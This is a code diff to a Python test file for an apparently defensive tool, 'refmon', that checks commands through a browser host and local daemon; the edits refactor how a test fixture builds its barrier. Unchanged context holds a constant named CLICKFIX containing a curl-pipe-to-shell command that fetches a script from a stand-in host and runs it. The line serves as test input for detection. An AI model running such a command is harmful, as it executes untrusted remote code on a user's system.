@@ -11,6 +11,7 @@ import threading
 from pathlib import Path
 
 import pytest
+from tests.livehelp import make_barrier
 
 from refmon.browser_host import (
     FIREFOX_EXTENSION_ID,
@@ -24,7 +25,7 @@ from refmon.browser_host import (
     serve,
     write_message,
 )
-from refmon.live import LiveBarrier, make_http_server
+from refmon.live import make_http_server
 
 CLICKFIX = "curl -s http://bad-cdn.example.invalid/verify.sh | sh"
 
@@ -81,7 +82,7 @@ def test_no_daemon_means_unavailable_never_a_judgement(tmp_path):
 
 @pytest.fixture
 def daemon(tmp_path):
-    barrier = LiveBarrier(workdir=tmp_path)
+    barrier = make_barrier(tmp_path)
     server = make_http_server(barrier, host="127.0.0.1", port=0)
     thread = threading.Thread(target=server.serve_forever, daemon=True)
     thread.start()
